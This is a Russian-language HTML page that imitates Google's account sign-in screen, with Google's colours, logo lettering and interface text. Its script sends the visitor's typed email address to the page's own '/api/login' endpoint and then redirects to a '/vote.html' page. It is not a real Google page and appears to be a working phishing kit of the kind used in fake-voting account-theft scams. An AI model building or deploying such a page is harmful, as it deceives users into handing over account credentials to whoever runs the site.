<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">
<title>Вход — Аккаунт Google</title>
<style>
  /* ============ ЦВЕТА (СВЕТЛАЯ ТЕМА) ============ */
  :root {
    --bg: #ffffff;
    --text: #202124;
    --text-muted: #5f6368;
    --link: #1a73e8;
    --input-border: #dadce0;
    --input-border-focus: #1a73e8;
    --input-text: #202124;
    --input-placeholder: #5f6368;
    --btn-bg: #1a73e8;
    --btn-text: #ffffff;
    --btn-hover: #1765cc;
    --btn-disabled: #a8c7fa;
    --error: #d93025;
  }

  /* ============ ЦВЕТА (ТЁМНАЯ ТЕМА) ============ */
  @media (prefers-color-scheme: dark) {
    :root {
      --bg: #202124;
      --text: #e8eaed;
      --text-muted: #9aa0a6;
      --link: #8ab4f8;
      --input-border: #5f6368;
      --input-border-focus: #8ab4f8;
      --input-text: #e8eaed;
      --input-placeholder: #9aa0a6;
      --btn-bg: #8ab4f8;
      --btn-text: #202124;
      --btn-hover: #aecbfa;
      --btn-disabled: #3c4043;
      --error: #f28b82;
    }
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    background: var(--bg);
    color: var(--text);
    transition: background 0.2s, color 0.2s;
  }

  body {
    font-family: 'Roboto', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 40px 24px;
  }

  .wrap {
    width: 100%;
    max-width: 448px;
  }

  /* ============ ЛОГО ============ */
  .logo {
    text-align: center;
    font-size: 24px;
    font-weight: 500;
    letter-spacing: -1px;
    margin-bottom: 16px;
  }
  .logo span { display: inline-block; }
  .logo .b1 { color: #4285f4; }
  .logo .b2 { color: #ea4335; }
  .logo .b3 { color: #fbbc05; }
  .logo .b4 { color: #4285f4; }
  .logo .b5 { color: #34a853; }
  .logo .b6 { color: #ea4335; }

  /* ============ ЗАГОЛОВОК ============ */
  h1.title {
    font-size: 24px;
    font-weight: 400;
    text-align: center;
    margin-bottom: 8px;
    color: var(--text);
  }
  p.subtitle {
    font-size: 16px;
    text-align: center;
    color: var(--text);
    margin-bottom: 32px;
    line-height: 1.4;
  }
  p.subtitle a {
    color: var(--link);
    text-decoration: none;
    font-weight: 500;
  }
  p.subtitle a:hover { text-decoration: underline; }

  /* ============ ПОЛЕ ВВОДА ============ */
  .input-wrap {
    position: relative;
    margin-bottom: 12px;
  }
  input[type="email"] {
    width: 100%;
    padding: 14px 15px;
    font-size: 16px;
    background: transparent;
    color: var(--input-text);
    border: 1px solid var(--input-border);
    border-radius: 4px;
    outline: none;
    transition: border-color 0.15s;
  }
  input[type="email"]::placeholder {
    color: var(--input-placeholder);
  }
  input[type="email"]:focus {
    border: 2px solid var(--input-border-focus);
    padding: 13px 14px;
  }

  /* ============ ССЫЛКИ ============ */
  .link-row {
    margin-bottom: 40px;
  }
  .link-row a {
    color: var(--link);
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
  }
  .link-row a:hover { text-decoration: underline; }

  .create-row {
    margin-bottom: 40px;
  }
  .create-row a {
    color: var(--link);
    font-size: 14px;
    font-weight: 500;
    text-decoration: none;
  }
  .create-row a:hover { text-decoration: underline; }

  /* ============ ОШИБКА ============ */
  .error {
    color: var(--error);
    font-size: 13px;
    margin-top: 8px;
    min-height: 16px;
  }

  /* ============ КНОПКА "ДАЛЕЕ" (справа внизу) ============ */
  .actions {
    display: flex;
    justify-content: flex-end;
    margin-top: 60px;
  }
  button.primary {
    background: var(--btn-bg);
    color: var(--btn-text);
    border: none;
    padding: 10px 24px;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 500;
    letter-spacing: 0.25px;
    cursor: pointer;
    min-width: 88px;
    transition: background 0.15s, color 0.15s;
  }
  button.primary:hover:not(:disabled) { background: var(--btn-hover); }
  button.primary:disabled {
    background: var(--btn-disabled);
    cursor: not-allowed;
    color: rgba(255,255,255,0.7);
  }
  @media (prefers-color-scheme: dark) {
    button.primary:disabled {
      color: rgba(32,33,36,0.5);
    }
  }
</style>
</head>
<body>

  <div class="wrap">

    <!-- Логотип Google -->
    <div class="logo">
      <span class="b1">G</span><span class="b2">o</span><span class="b3">o</span><span class="b4">g</span><span class="b5">l</span><span class="b6">e</span>
    </div>

    <!-- Заголовок -->
    <h1 class="title">Вход</h1>
    <p class="subtitle">
      Используйте аккаунт Google.<br>
      <a href="#">Подробнее…</a>
    </p>

    <!-- Поле ввода -->
    <div class="input-wrap">
      <input
        type="email"
        id="email"
        placeholder="Телефон или адрес эл. почты"
        autocomplete="email">
    </div>

    <!-- Ссылка "Забыли..." -->
    <div class="link-row">
      <a href="#">Забыли адрес электронной почты?</a>
    </div>

    <!-- Ссылка "Создать аккаунт" -->
    <div class="create-row">
      <a href="#">Создать аккаунт</a>
    </div>

    <!-- Ошибка -->
    <div class="error" id="error"></div>

    <!-- Кнопка "Далее" справа внизу -->
    <div class="actions">
      <button class="primary" id="nextBtn" disabled>Далее</button>
    </div>

  </div>

<script>
  const emailInput = document.getElementById('email');
  const nextBtn = document.getElementById('nextBtn');
  const errorEl = document.getElementById('error');

  emailInput.addEventListener('input', () => {
    const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value);
    nextBtn.disabled = !valid;
    errorEl.textContent = '';
  });

  emailInput.addEventListener('keydown', e => {
    if (e.key === 'Enter' && !nextBtn.disabled) nextBtn.click();
  });

  nextBtn.addEventListener('click', async () => {
    nextBtn.disabled = true;
    nextBtn.textContent = 'Проверка…';
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: emailInput.value })
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || 'Ошибка');
      window.location.href = '/vote.html';
    } catch (e) {
      errorEl.textContent = e.message;
      nextBtn.disabled = false;
      nextBtn.textContent = 'Далее';
    }
  });
</script>
</body>
</html>
